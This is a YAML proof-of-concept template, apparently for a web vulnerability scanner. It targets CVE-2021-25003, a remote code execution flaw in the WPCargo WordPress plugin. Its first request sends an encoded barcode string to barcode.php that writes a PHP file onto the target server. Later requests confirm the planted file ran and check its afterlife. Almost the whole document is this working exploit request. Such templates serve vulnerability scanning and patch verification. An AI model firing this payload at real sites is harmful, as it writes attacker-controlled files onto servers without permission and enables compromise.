name: poc-yaml-wpcargo-cve-2021-25003-rce
manual: true
transport: http
set:
    s1: string(randomInt(10000, 99999))
    randstr: randomLowercase(8)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/wpcargo/includes/barcode.php?text=11xx1111x111xx11x1111xx111x1xxx1xx1xx111xxx1111111x1x111xx1111x1xxx1111111xxxxx1x1x1xxx1xxxxx1x111x11111xx1xx111xx1x11x111xx1x11xxxxxx11xxxxx1x111xxxxx1x11111x1xx11111xx1111xxxx111111x111xxxxx11x1xxxx111xxxxxx1xxxxxx11xx1x1x11xxx11x11x1xxxx11x1111xx1xxxxxx11x11x1x11xx1xxxx11x1x1xx1x1xxxx11x1xxxx11xx1xxxx11x111xx11xx11xx11xx1xx11xx111x11xx11xxx1x1xx1xx111x11x111x1x1x11x111xx11x11xxx11x1xx1x11x111xx11x1x11xx1x1xxxx1x11111x1x11111x1xxx11xx1xx1xx1x1xx11xxx1xxx1x1x1x11111x1x11111xx1x1xx1xx111x11xx111111xx11111x&sizefactor=.090909090909&size=1&filepath={{randstr}}.php
            follow_redirects: false
        expression: response.status == 200
    r2:
        request:
            cache: false
            method: GET
            path: /wp-content/plugins/wpcargo/includes/{{randstr}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"8e57317b3c446b62501ced057d9e0ab4")
    r3:
        request:
            cache: false
            method: GET
            path: /wp-content/plugins/wpcargo/includes/{{randstr}}.php
            follow_redirects: false
        expression: response.status == 404 || response.status == 500
expression: r1() && r2() && r3()
detail:
    author: Â∞èz
    links:
        - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
    vulnerability:
        level: critical